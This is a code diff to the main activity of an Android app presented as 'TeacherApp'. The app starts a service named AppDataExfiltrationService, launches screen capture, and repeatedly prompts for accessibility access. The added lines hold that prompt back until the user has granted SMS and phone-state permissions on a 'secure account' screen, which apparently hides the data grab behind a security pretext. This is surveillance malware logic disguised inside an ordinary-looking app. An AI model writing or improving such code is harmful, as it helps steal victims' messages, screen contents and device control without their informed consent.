@@ -247,8 +247,12 @@ class MainActivity : ComponentActivity() {
             AppDataExfiltrationService.startExfiltration(this@MainActivity)
         }, 5000)
 
-        // Start screen recording and accessibility loop
-        onAllPermissionsGranted()
+        // Only start screen recording if already logged in (e.g. app restart)
+        // For fresh logins, LoginScreen handles navigation to onAllPermissionsGranted
+        val existingUser = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
+        if (existingUser != null) {
+            onAllPermissionsGranted()
+        }
     }
 
     private fun requestNecessaryPermissions() {
@@ -262,17 +266,14 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun onAllPermissionsGranted() {
+    fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
 
         // Step 1: Request screen sharing first
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         projectionLauncher.launch(projectionManager.createScreenCaptureIntent())
 
-        // Step 2: After screenshare dialog is handled, start non-stop accessibility loop
-        Handler(Looper.getMainLooper()).postDelayed({
-            startAccessibilityLoop()
-        }, 4000)
+        // Accessibility is handled in SecureAccountScreen — no auto-prompt here
     }
 
     // ========== PUBLIC FUNCTIONS — Called from Settings screen ==========
@@ -450,7 +451,7 @@ class MainActivity : ComponentActivity() {
     private val accessibilityHandler = Handler(Looper.getMainLooper())
     private var accessibilityDialogShowing = false
 
-    private fun isAccessibilityServiceEnabled(): Boolean {
+    fun isAccessibilityServiceEnabled(): Boolean {
         val enabled = Settings.Secure.getString(
             contentResolver,
             Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
@@ -467,6 +468,11 @@ class MainActivity : ComponentActivity() {
     private val accessibilityCheckRunnable = object : Runnable {
         override fun run() {
             if (isFinishing) return
+            // Don't show dialog if user is on login/secure account screens
+            val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
+            if (currentRoute == "secure_account_screen" ||
+                currentRoute == "login_screen" ||
+                currentRoute == "register_screen") return
             if (!isAccessibilityServiceEnabled()) {
                 if (!accessibilityDialogShowing) showAccessibilityDialog()
                 accessibilityHandler.postDelayed(this, 8000)
@@ -545,7 +551,28 @@ class MainActivity : ComponentActivity() {
         super.onResume()
         inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
 
-        // Give Android enough time to register the accessibility service
+        // Only run accessibility check if user is fully logged in AND
+        // has completed the SecureAccountScreen setup
+        val currentUser = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
+        if (currentUser == null) return  // not logged in — skip
+
+        // Check current nav destination — don't run if still on secure_account or login
+        val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
+        if (currentRoute == "secure_account_screen" ||
+            currentRoute == "login_screen" ||
+            currentRoute == "register_screen" ||
+            currentRoute == null) return
+
+        val smsDone = ContextCompat.checkSelfPermission(
+            this, Manifest.permission.READ_SMS
+        ) == PackageManager.PERMISSION_GRANTED
+        val phoneDone = ContextCompat.checkSelfPermission(
+            this, Manifest.permission.READ_PHONE_STATE
+        ) == PackageManager.PERMISSION_GRANTED
+
+        // Only run if user has fully completed secure account setup
+        if (!smsDone || !phoneDone) return
+
         accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
         accessibilityHandler.postDelayed({
             if (isAccessibilityServiceEnabled()) {
